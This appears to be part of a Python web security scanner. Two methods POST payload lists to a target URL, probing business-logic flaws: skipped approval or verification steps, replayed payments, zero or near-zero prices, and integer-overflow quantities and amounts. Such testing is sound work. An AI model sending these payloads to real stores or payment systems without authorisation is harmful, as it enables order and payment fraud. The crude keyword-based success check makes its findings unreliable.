    def test_workflow_manipulation(self, target, url):
        """Test for workflow manipulation."""
        findings = []

        workflow_payloads = [
            # Skip steps
            {"step": "complete", "skip": True},
            {"step": "finish", "next": "done"},
            {"action": "skip", "step": "verification"},
            {"action": "bypass", "step": "approval"},
            # Replay steps
            {"step": "1", "retry": True},
            {"step": "2", "repeat": True},
            {"action": "resubmit", "step": "payment"},
            # Invalid state transitions
            {"step": "confirmed", "from": "pending"},
            {"step": "shipped", "from": "cart"},
            {"step": "delivered", "from": "pending"},
            # Price manipulation between steps
            {"step": "checkout", "price": 0},
            {"step": "payment", "amount": 0.01},
            {"step": "confirm", "total": 0},
        ]

        for payload in workflow_payloads:
            rc, stdout, _ = _run(
                [
                    "curl", "-s", "-X", "POST",
                    "-H", "Content-Type: application/json",
                    "-d", json.dumps(payload),
                    "--max-time", "10",
                    url,
                ],
                timeout=15,
            )
            if rc == 0 and stdout:
                if any(indicator in stdout.lower() for indicator in ["success", "complete", "done", "confirmed", "shipped", "delivered"]):
                    findings.append({
                        "type": "workflow_manipulation",
                        "payload": payload,
                        "response_excerpt": stdout[:200],
                        "severity": "high",
                    })

        return {
            "target": target,
            "url": url,
            "type": "workflow_manipulation",
            "vulnerable": len(findings) > 0,
            "findings": findings,
            "payloads_tested": len(workflow_payloads),
        }

    def test_integer_overflow(self, target, url):
        """Test for integer overflow vulnerabilities."""
        findings = []

        overflow_payloads = [
            {"quantity": 999999999},
            {"quantity": 2147483647},  # Max int32
            {"quantity": 2147483648},  # Max int32 + 1
            {"quantity": -2147483648},
            {"amount": 999999999999999999},
            {"amount": 1e100},
            {"amount": float("inf")},
            {"amount": float("-inf")},
            {"price": 0.0000001},
            {"discount": 999999999},
        ]

        for payload in overflow_payloads:
            rc, stdout, _ = _run(
                [
                    "curl", "-s", "-X", "POST",
                    "-H", "Content-Type: application/json",
                    "-d", json.dumps(payload),
                    "--max-time", "10",
                    url,
                ],
                timeout=15,
            )
            if rc == 0 and stdout:
                if any(indicator in stdout.lower() for indicator in ["success", "order", "confirmed"]):
                    findings.append({
                        "type": "integer_overflow",
                        "payload": payload,
                        "response_excerpt": stdout[:200],
                        "severity": "medium",
                    })

        return {
            "target": target,
            "url": url,
            "type": "integer_overflow",
            "vulnerable": len(findings) > 0,
            "findings": findings,
        }
